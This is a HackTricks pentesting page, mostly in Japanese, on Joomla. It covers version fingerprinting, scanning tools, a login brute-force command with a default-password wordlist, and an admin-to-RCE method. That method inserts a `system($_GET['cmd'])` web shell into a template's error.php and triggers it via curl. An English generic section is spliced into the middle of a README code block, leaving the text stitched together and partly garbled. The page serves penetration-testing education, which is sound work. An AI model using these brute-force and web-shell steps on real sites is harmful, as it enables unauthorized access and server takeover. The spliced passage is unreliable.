# Joomla

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> - <a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセス**したいですか、または**HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)のコレクションを見つけてください
* [**公式PEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう
* **[💬](https://emojipedia.org/speech-balloon/) [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter**で**🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォロー**してください。
* **ハッキングトリックを共有するために、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>

### Joomlaの統計

Joomlaは、Joomlaのインストールで使用されているJoomla、PHP、データベースバージョン、およびサーバーのオペレーティングシステムの分析など、いくつかの匿名の[使用統計](https://developer.joomla.org/about/stats.html)を収集しています。このデータは、彼らの公開[API](https://developer.joomla.org/about/stats/api.html)を介してクエリできます。
```bash
curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool

{
"data": {
"cms_version": {
"3.0": 0,
"3.1": 0,
"3.10": 6.33,
"3.2": 0.01,
"3.3": 0.02,
"3.4": 0.05,
"3.5": 12.24,
"3.6": 22.85,
"3.7": 7.99,
"3.8": 17.72,
"3.9": 27.24,
"4.0": 3.21,
"4.1": 1.53,
"4.2": 0.82,
"4.3": 0,
"5.0": 0
},
"total": 2951032
}
}
```
## 列挙

### 発見/フットプリンティング

* **meta**をチェック
```bash
curl https://www.joomla.org/ | grep Joomla | grep generator

<meta name="generator" content="Joomla! - Open Source Content Management" />
```
* robots.txt
```
# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
[...]
```
* README.txt

## Joomla

### Information Gathering

#### Version Detection

JoomScan is a tool used to detect the version of Joomla running on the target web server. It can be used to identify potential vulnerabilities associated with the detected version.

```bash
./joomscan.pl -u <target_url>
```

### Enumeration

#### User Enumeration

Joomraider is a tool that can be used to enumerate users in Joomla. It can help identify valid usernames that can be used in further attacks.

```bash
python joomraider.py -u <target_url>
```

### Exploitation

#### Known Vulnerabilities

Exploit Database and other sources can be used to find known vulnerabilities in the detected Joomla version. These vulnerabilities can be exploited to gain unauthorized access to the Joomla application.

### Post-Exploitation

#### Privilege Escalation

Once access to the Joomla application is gained, privilege escalation techniques can be used to elevate privileges and gain further control over the application and the underlying server.

### Conclusion

Joomla websites can be vulnerable to various attacks if not properly secured. It is important to regularly update the Joomla installation and follow security best practices to prevent unauthorized access and data breaches.
```
1- What is this?
* This is a Joomla! installation/upgrade package to version 3.x
* Joomla! Official site: https://www.joomla.org
* Joomla! 3.9 version history - https://docs.joomla.org/Special:MyLanguage/Joomla_3.9_version_history
* Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/staging
```
### バージョン

* **/administrator/manifests/files/joomla.xml** でバージョンを確認できます。
* **/language/en-GB/en-GB.xml** でJoomlaのバージョンを取得できます。
* **plugins/system/cache/cache.xml** ではおおよそのバージョンが確認できます。
```bash
droopescan scan joomla --url http://joomla-site.local/
```
### Brute-Force

[このスクリプト](https://github.com/ajnik/joomla-bruteforce)を使用して、ログインをブルートフォースしよう。
```shell-session
sudo python3 joomla-brute.py -u http://joomla-site.local/ -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin

admin:admin
```
## RCE

**管理者資格情報**を取得した場合、**PHPコードのスニペット**を追加して**RCE**を獲得できます。これは**テンプレート**を**カスタマイズ**することで行います。

1. `Configuration`の下にある**`Templates`**をクリックして、テンプレートメニューを表示します。
2. `Template`列ヘッダーの下にある**`protostar`**を選択して、**`Templates: Customise`**ページに移動します。
3. 最後に、**ページソース**を表示するためにページをクリックします。**`error.php`**ページを選択し、以下のように**PHPのワンライナーを追加**してコード実行を行います:
   - **`system($_GET['cmd']);`**
4. **保存して閉じる**
5. `curl -s http://joomla-site.local/templates/protostar/error.php?cmd=id`
